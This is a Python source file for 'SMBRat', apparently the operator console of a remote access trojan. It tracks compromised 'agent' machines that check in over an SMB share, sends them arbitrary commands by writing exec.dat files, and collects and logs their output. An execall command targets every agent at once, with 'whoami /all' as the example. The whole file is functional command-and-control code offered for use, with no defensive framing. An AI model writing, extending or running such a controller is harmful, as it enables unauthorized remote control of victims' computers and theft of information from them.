import argparse
import cmd
import os
import pprint
import time

from watchdog.events import FileSystemEventHandler, DirCreatedEvent
from watchdog.observers import Observer

from termcolor import colored

EXEC_DAT = 'exec.dat'
OUTPUT_DAT = 'output.dat'
PING_DAT = 'ping.dat'
INFO_DAT = 'info.dat'
CHECKIN_DAT = 'checkin.dat'
HIST_DAT = 'hist.dat'
Share = None
No_history = False

Sessions = dict()


class CLIArgumentParser( argparse.ArgumentParser ) :
	def exit(self, ex_code = 1, message = "Unrecognised") : return


def get_path(agent, project = None, file = INFO_DAT):
	if project == None:
		project = find_project(agent)
	return Share + os.sep + project + os.sep + agent + os.sep + file

def get_exec_path(project, agent):
	return get_path( agent, project, EXEC_DAT )

def get_output_path(project, agent):
	return get_path( agent, project, OUTPUT_DAT )


def find_project(agent):
	for project in Sessions.keys():
		if agent in Sessions[project].keys():
			return project
	raise Error('[!] Project Not Found for Agent "{}"'.format(colored(agent,'red')))

def initialize(share_folder) :
	"""
	Traverse the "Share/" shared folder and parse the tree of Projects and Agents.
	Share/
		|
		\--Project1
		|		|
		|		\--<Hostname1>-<MAC_ADDRESS1>
		|		\--<Hostname2>-<MAC_ADDRESS2>
		|
		\--Project2
				|
				\--<Hostname3>-<MAC_ADDRESS3>
		[...]
	"""
	global Share
	Share = share_folder

	#Changed os.listdir to os.walk which returns [path/of/dir, [tupple, of, directories], [tuple, of, files]]
	for project in os.listdir(share_folder):
		# print (project)
		if os.path.isfile(project):
			continue
		Sessions[project] = {}
		project_dir = Share + os.sep + project
		for agent in os.listdir(project_dir):
			if os.path.isfile(agent):
				continue
			agent_dir = project_dir + os.sep + agent + os.sep
			Sessions[project][agent] = {}
			# Sessions[project][agent]['exec'] = os.path.isfile(agent_dir + EXEC_DAT)
			# Sessions[project][agent]['output'] = os.path.isfile(agent_dir + OUTPUT_DAT)


def check_active(project, agents = None, timeout = 20):
	ret = {}
	if agents == None:
		agents = Sessions[project].keys()
	for agent in agents:
		agent_ping_path = get_path(agent, project, PING_DAT)
		now = int(time.time())
		# Get the Modified Time of "ping.dat" of the Agent
		mtime = os.stat(agent_ping_path)[-2]
		pinged_before = int(now) - mtime
		alive = timeout - pinged_before > 0
		ret[agent] = {
			'alive' : alive,
			'last' : pinged_before
			}
	return ret


class SessionHandler(FileSystemEventHandler) :

	def on_created(self, event):
		# print(event, event.src_path.endswith(CHECKIN_DAT), CHECKIN_DAT)
		if event.src_path.endswith(CHECKIN_DAT):
			# if path of type .../<Share>/<ProjectName>/<Agent-MAC>/checkin.dat
			project, agent = event.src_path.split(os.sep)[-3:-1]
			# MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
			agent_hostname, agent_mac = agent[:-18], agent[-17:]
			# print (project, agent_hostname, agent_mac)
			print ('''
[+] Agent "{}" ({}) just checked-in for Project: "{}"
'''.format(colored(agent_hostname,'green'),
	colored(agent_mac,'grey'),
	colored(project,'blue'))
	)
			Sessions[project] = {}
			Sessions[project][agent] = {}
		# print (Sessions)


	def on_deleted(self, event):
		if event.src_path.endswith(EXEC_DAT):
			# event.src_path: <Share>/<ProjectName>/<Agent-MAC>/<file_deleted>
			# changed event.src_path.split(os.sep)[-1:-1] to event.src_path.split(os.sep)[-3:-1]
			project, agent = event.src_path.split(os.sep)[-3:-1]
			output_dat = get_output_path(project, agent)
			with open(output_dat, 'r') as output_file:
				response = output_file.read()
			print ('''
[<] Response from '{project}/{hostname}': 

{response}
^^^^^^^^^^^^^^^^^^^^ {project}/{hostname} ^^^^^^^^^^^^^^^^^^^^
				'''.format(project = colored(project,'blue'),
					hostname = colored(agent,'green'),
					response = colored(response,'white', attrs=['bold'])
					)
				) 
			if not No_history:
				history_dat = get_path(agent, project, HIST_DAT)
				# os.touch( history_dat )
				# os.system("touch {}".format(history_dat))	# Dirty for file creation
				with open(history_dat, 'a') as history_file:
					history_file.write('''
	{response}
		=========== {timestamp} ===========
	'''.format(response = response,
		timestamp = time.ctime())
			)


class SMBRatShell(cmd.Cmd) :

	def __init__(self, session_dict) :
		super().__init__()
		self.prompt = colored('SMBRat', 'red') + colored("> ", 'white', attrs=['bold'])
		self.session_dict = session_dict
		self.selected = set()
		self.agent_list = []

	# def do_EOF(self, *args): return ''
	def emptyline(self, *args): return ''

	def do__session(self, line):
		pprint.pprint(self.session_dict)
		pass

	def do_selected(self, line): 
		arg_parser = CLIArgumentParser()
		arg_parser.add_argument('--add', '-a', help = 'Add an Agent to the "selected" list', nargs = '+', default = [])
		arg_parser.add_argument('--remove', '-r', help = 'Remove an Agent from the "selected" list', nargs = '+', default = [])
		arg_parser.add_argument('--clear', '-c', help = 'Remove ALL Agents from the "selected" list',  action = 'store_true')
		args = arg_parser.parse_args(line.split())

		if args.clear :
			self.selected = set()
			return

		arg_list = []
		if args.add:
			arg_list.extend(args.add)
		if args.remove:
			arg_list.extend(args.remove)

		for i, n_arg in enumerate( arg_list ):
			try:
				agent = self.agent_list[int(n_arg)]
			except :
				agent = n_arg
			try:
				project = find_project(agent)
			except:
				print ("Agent '{}' not found".format( colored(agent,'red') ))
				continue
			if i < len(args.add):	# It is an '--add' argument
				self.selected.add( agent )
			else:					# It is an '--remove' argument
				try :
					self.selected.remove( agent )
				except :
					print ("[!] Agent {} not Selected".format(colored(agent,'red')) )

		if not self.selected:
			print (colored("No Agents selected!", 'magenta'))
			return
		self.onecmd("agents --selected")


	def do_agents(self, line):
		"""
> agents

Shows the list of Selected Agents

		"""
		arg_parser = CLIArgumentParser()
		arg_parser.add_argument('--list', '-l', help = 'Show last Agent List', action = 'store_true')
		arg_parser.add_argument('--active', '-a', help = 'List all Active Agents', type = int, default = 0, nargs = '?')
		arg_parser.add_argument('--find', '-f', help = 'Search for a substring in all available Agent names', type = str)
		arg_parser.add_argument('--selected', '-s', help = 'List all Selected Agents', action = 'store_true')
		# arg_parser.add_argument('-v', help = 'List all Agents with verbosity', action = 'store_true')
		args = arg_parser.parse_args(line.split())
		if args.active == None :	# If --active was set alone
			args.active = 20		# give it default value
		elif args.active <= 0 :		# If --active was not set
			args.active = None		# Turn it to "None"
		# print (args.active)

		if args.selected:
			args.list = True
			self.agent_list = list(self.selected)

		if args.list:
			for i, agent in enumerate(self.agent_list):
				print ("{:3}) {}".format(i, agent))
			return
		self.agent_list = []

		for project in  self.session_dict.keys():
			active_agents = check_active(project, timeout = args.active if args.active else 20)
			print ( "=== {}".format(project) )

			for agent, act_tuple in active_agents.items():
				if args.active != None:
					if not act_tuple['alive']:	# if Agent isn't active
						continue				# Do not print its status
				print ("[{alive}] {agent} ({last} secs ago)".format(
					alive = colored("X" if act_tuple['alive'] else " ",'green',attrs=['bold']),
					agent = colored(agent, 'green'),
					last = int(act_tuple['last'])
					)
				)
				self.agent_list.append(agent)
		return


	def do_execall(self, line):
		"""
> execall <cmd>

Runs the <cmd> to *ALL AGENTS*
Example:
> execall "whoami /all"

		"""
		saved_selected = self.selected
		allset = set()
		for project in self.session_dict.keys():
			for agent in self.session_dict[project].keys():
				allset.add( agent )

		self.selected = allset
		self.do_exec(line)
		self.selected = saved_selected


	def do_exec(self, line):
		"""
> exec <cmd>

Runs the <cmd> to the selected Agents
Example:
> exec "whoami /all"
		"""
		for agent in self.selected:
			print (agent)
			project = find_project(agent)
			exec_path = get_exec_path(project, agent)
			try :
				with open(exec_path, 'w+') as exfile:
					exfile.write(line)
					print ('''
[>] Sending '{command}' to "{project}/{hostname}" ...'''.format(command = colored(line,'cyan', attrs=['bold']),
							project = colored(project, 'blue'),
							hostname = colored(agent, 'green'))
					)

			except PermissionError as perror:
				print ('''
[!!!] Could not write to '{path}'.

Usually happens because the SMB Server (who creates the files) runs as "root" (to bind the port 445 TCP).
Type the command below to a new root shell and retry:
	chmod -R 777 "{share}"'''.format(path = exec_path, share = Share) )
				return

	def do_exit(self, line):
		return True


if __name__ == '__main__' :

	parser = argparse.ArgumentParser()

	parser.add_argument('SHARE_PATH', help = 'Path to the directory that is used with the SMB Share')
	parser.add_argument('--no-history', help = 'Disables storing the Command Outputs in a history file per Agent', action='store_true')
	# parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
						# default = False, action = 'store_true')

	args = parser.parse_args()
	# print (args)
	No_history = args.no_history
	share_folder = args.SHARE_PATH
	initialize(share_folder)

	shell = SMBRatShell(Sessions)

	observer = Observer()
	event_handler = SessionHandler()
	observer.schedule(event_handler, share_folder, recursive=True)
	observer.start()

	shell.cmdloop()